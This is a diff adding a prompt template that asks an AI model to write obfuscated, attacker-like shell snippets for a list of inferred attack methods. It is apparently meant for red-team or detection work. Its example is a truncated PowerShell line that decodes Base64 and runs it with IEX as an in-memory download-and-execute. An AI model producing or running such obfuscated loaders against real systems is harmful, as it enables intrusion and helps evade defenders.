@@ -1,0 +1,18 @@
+<task>Simulate adversarial payload generation for each provided attack method using shell code or scripts.</task>
+<instruction>Based on the list of inferred attack methods from the previous analysis step, create a plausible shell code or script snippet for each method that emulates real-world attacker behavior.</instruction>
+<dos>– Use obfuscation techniques such as Base64 encoding, hex encoding, string splitting, or environment variables.
+– Align each payload closely with the described attack method.
+– Format code in readable code blocks and include comments where helpful.</dos>
+<donts>– Do not produce actual malware binaries or irreversible destructive commands.
+– Do not include instructions for real deployment or execution.
+– Do not mix in defensive advice or unrelated commentary.</donts>
+<example>For "Base64-encoded PowerShell download and execute":
+
+powershell
+Copy
+Edit
+$e='JABXAB0APQAoACIA...=='; IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e)))
+This simulates an in-memory download and execution of a remote payload via obfuscated PowerShell.</example>
+<content>
+{content}
+</content>
